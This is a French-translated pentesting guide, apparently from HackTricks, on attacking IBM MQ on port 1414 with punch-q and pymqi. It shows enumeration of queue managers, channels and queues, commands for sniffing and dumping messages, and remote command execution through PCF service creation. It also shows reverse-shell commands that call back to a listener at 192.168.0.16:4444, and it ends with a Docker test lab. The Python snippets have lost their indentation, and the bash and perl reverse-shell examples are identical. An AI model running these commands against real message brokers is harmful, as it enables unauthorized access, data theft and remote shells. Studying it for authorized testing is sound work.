# 1414 - Pentesting IBM MQ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©**? Vous voulez voir votre **entreprise annoncÃ©e dans HackTricks**? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version du PEASS ou tÃ©lÃ©charger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dÃ©pÃ´t hacktricks](https://github.com/carlospolop/hacktricks) et [dÃ©pÃ´t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Informations de base

IBM MQ est une technologie IBM pour gÃ©rer les files d'attente de messages. Comme d'autres technologies de **courtier de messages**, elle est dÃ©diÃ©e Ã  recevoir, stocker, traiter et classer des informations entre les producteurs et les consommateurs.

Par dÃ©faut, **il expose le port TCP IBM MQ 1414**.
Parfois, une API REST HTTP peut Ãªtre exposÃ©e sur le port **9443**.
Les mÃ©triques (Prometheus) pourraient Ã©galement Ãªtre accessibles depuis le port TCP **9157**.

Le port TCP IBM MQ 1414 peut Ãªtre utilisÃ© pour manipuler des messages, des files d'attente, des canaux, ... mais **aussi pour contrÃ´ler l'instance**.

IBM fournit une vaste documentation technique disponible sur [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq).

## Outils

Un outil suggÃ©rÃ© pour une exploitation facile est **[punch-q](https://github.com/sensepost/punch-q)**, avec l'utilisation de Docker. L'outil utilise activement la bibliothÃ¨que Python `pymqi`.

Pour une approche plus manuelle, utilisez la bibliothÃ¨que Python **[pymqi](https://github.com/dsuch/pymqi)**. Les [dÃ©pendances IBM MQ](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) sont nÃ©cessaires.

### Installation de pymqi

Les **dÃ©pendances IBM MQ** doivent Ãªtre installÃ©es et chargÃ©es :

1. CrÃ©ez un compte (IBMid) sur [https://login.ibm.com/](https://login.ibm.com/).
2. TÃ©lÃ©chargez les bibliothÃ¨ques IBM MQ depuis [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc). Pour Linux x86_64, il s'agit de **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**.
3. DÃ©compressez (`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`).
4. ExÃ©cutez `sudo ./mqlicense.sh` pour accepter les termes de licence.

>Si vous Ãªtes sous Kali Linux, modifiez le fichier `mqlicense.sh` : supprimez/commentez les lignes suivantes (entre les lignes 105-110) :
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. Installez ces packages:
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. Ensuite, ajoutez temporairement les fichiers `.so` Ã  LD: `export LD_LIBRARY_PATH=/opt/mqm/lib64`, **avant** d'exÃ©cuter d'autres outils utilisant ces dÃ©pendances.

Ensuite, vous pouvez cloner le projet [**pymqi**](https://github.com/dsuch/pymqi): il contient des extraits de code intÃ©ressants, des constantes, ... Ou vous pouvez directement installer la bibliothÃ¨que avec: `pip install pymqi`.

### Utilisation de punch-q

#### Avec Docker

Utilisez simplement: `sudo docker run --rm -ti leonjza/punch-q`.

#### Sans Docker

Clonez le projet [**punch-q**](https://github.com/sensepost/punch-q) puis suivez le readme pour l'installation (`pip install -r requirements.txt && python3 setup.py install`).

Ensuite, il peut Ãªtre utilisÃ© avec la commande `punch-q`.

## Ã‰numÃ©ration

Vous pouvez essayer d'Ã©numÃ©rer le **nom du gestionnaire de file d'attente, les utilisateurs, les canaux et les files d'attente** avec **punch-q** ou **pymqi**.

### Gestionnaire de file d'attente

Parfois, il n'y a aucune protection contre l'obtention du nom du gestionnaire de file d'attente:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### Canaux

**punch-q** utilise une liste de mots internes (modifiable) pour trouver des canaux existants. Exemple d'utilisation :
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
Il arrive que certaines instances IBM MQ acceptent des requÃªtes MQ **non authentifiÃ©es**, donc `--username / --password` n'est pas nÃ©cessaire. Bien sÃ»r, les droits d'accÃ¨s peuvent Ã©galement varier.

DÃ¨s que nous obtenons un nom de canal (ici : `DEV.ADMIN.SVRCONN`), nous pouvons Ã©numÃ©rer tous les autres canaux.

L'Ã©numÃ©ration peut essentiellement Ãªtre effectuÃ©e avec cet extrait de code `code/examples/dis_channels.py` de **pymqi**:
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
... Mais **punch-q** intÃ¨gre Ã©galement cette partie (avec plus d'informations!).
Il peut Ãªtre lancÃ© avec:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### Files d'attente

Il y a un extrait de code avec **pymqi** (`dis_queues.py`) mais **punch-q** permet de rÃ©cupÃ©rer plus d'informations sur les files d'attente :
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### Extraire

Vous pouvez cibler des files d'attente/canaux pour renifler / extraire des messages d'eux (opÃ©ration non destructive). *Exemples:*
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**N'hÃ©sitez pas Ã  itÃ©rer sur toutes les files d'attente identifiÃ©es.**

### ExÃ©cution de code

> Quelques dÃ©tails avant de continuer : IBM MQ peut Ãªtre contrÃ´lÃ© de plusieurs faÃ§ons : MQSC, PCF, Commande de contrÃ´le. Certaines listes gÃ©nÃ©rales peuvent Ãªtre trouvÃ©es dans la [documentation IBM MQ](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison).
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***Formats de commandes programmables***) est ce sur quoi nous nous concentrons pour interagir Ã  distance avec l'instance. **punch-q** et plus loin **pymqi** sont basÃ©s sur des interactions PCF.
>
> Vous pouvez trouver une liste des commandes PCF :
> * [Depuis la documentation PCF](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats), et
> * [depuis les constantes](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes).
>
> Une commande intÃ©ressante est `MQCMD_CREATE_SERVICE` et sa documentation est disponible [ici](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms). Elle prend en argument une `StartCommand` pointant vers un programme local sur l'instance (exemple : `/bin/sh`).
>
> Il y a aussi un avertissement de la commande dans la documentation : *"Attention : Cette commande permet Ã  un utilisateur d'exÃ©cuter une commande arbitraire avec l'autoritÃ© mqm. Si des droits sont accordÃ©s pour utiliser cette commande, un utilisateur malveillant ou nÃ©gligent pourrait dÃ©finir un service qui endommage vos systÃ¨mes ou vos donnÃ©es, par exemple, en supprimant des fichiers essentiels."*
>
> *Remarque : toujours selon la documentation IBM MQ (RÃ©fÃ©rence d'administration), il existe Ã©galement un point de terminaison HTTP Ã  `/admin/action/qmgr/{qmgrName}/mqsc` pour exÃ©cuter l'Ã©quivalent de la commande MQSC pour la crÃ©ation de service (`DEFINE SERVICE`). Cet aspect n'est pas encore abordÃ© ici.*

La crÃ©ation / suppression de service avec PCF pour l'exÃ©cution de programme Ã  distance peut Ãªtre faite par **punch-q** :

**Exemple 1**
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> Dans les journaux d'IBM MQ, vous pouvez lire que la commande a Ã©tÃ© exÃ©cutÃ©e avec succÃ¨s :
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: La commande '808544aa7fc94c48' a dÃ©marrÃ©. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

Vous pouvez Ã©galement Ã©numÃ©rer les programmes existants sur la machine (ici `/bin/doesnotexist` ... n'existe pas) :
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**Soyez conscient que le lancement du programme est asynchrone. Vous avez donc besoin d'un deuxiÃ¨me Ã©lÃ©ment pour exploiter la faille** ***(Ã©couteur pour shell inversÃ©, crÃ©ation de fichier sur un service diffÃ©rent, exfiltration de donnÃ©es Ã  travers le rÃ©seau ...)***

**Exemple 2**

Pour un shell inversÃ© facile, **punch-q** propose Ã©galement deux charges utiles de shell inversÃ© :

* Une avec bash
* Une avec perl

*Bien sÃ»r, vous pouvez en crÃ©er une personnalisÃ©e avec la commande `execute`.*

Pour bash :
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
Pour Perl :
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### PCF personnalisÃ©

Vous pouvez consulter la documentation d'IBM MQ et utiliser directement la bibliothÃ¨que python **pymqi** pour tester une commande PCF spÃ©cifique non implÃ©mentÃ©e dans **punch-q**.

**Exemple :**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
Si vous ne trouvez pas les noms des constantes, vous pouvez vous rÃ©fÃ©rer Ã  la [documentation IBM MQ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors).

> *Exemple pour [`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) (DÃ©cimal = 73). Il nÃ©cessite le paramÃ¨tre `MQCA_CLUSTER_NAME` (DÃ©cimal = 2029) qui peut Ãªtre `*` (Doc: ):*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Erreur")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## Environnement de test

Si vous souhaitez tester le comportement et les exploits d'IBM MQ, vous pouvez mettre en place un environnement local basÃ© sur Docker :

1. Avoir un compte sur ibm.com et cloud.ibm.com.
2. CrÃ©er un IBM MQ conteneurisÃ© avec :
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
Par dÃ©faut, l'authentification est activÃ©e, le nom d'utilisateur est `admin` et le mot de passe est `passw0rd` (Variable d'environnement `MQ_ADMIN_PASSWORD`).
Ici, le nom du gestionnaire de file d'attente a Ã©tÃ© dÃ©fini sur `MYQUEUEMGR` (variable `MQ_QMGR_NAME`).

Vous devez avoir IBM MQ en cours d'exÃ©cution avec ses ports exposÃ©s :
```bash
â¯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> La vieille version des images Docker IBM MQ se trouve Ã  l'adresse : https://hub.docker.com/r/ibmcom/mq/.

## RÃ©fÃ©rences

* [gist de mgeeky - "Notes pratiques sur les tests de pÃ©nÃ©tration IBM MQ"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [Documentation IBM MQ](https://www.ibm.com/docs/en/ibm-mq)
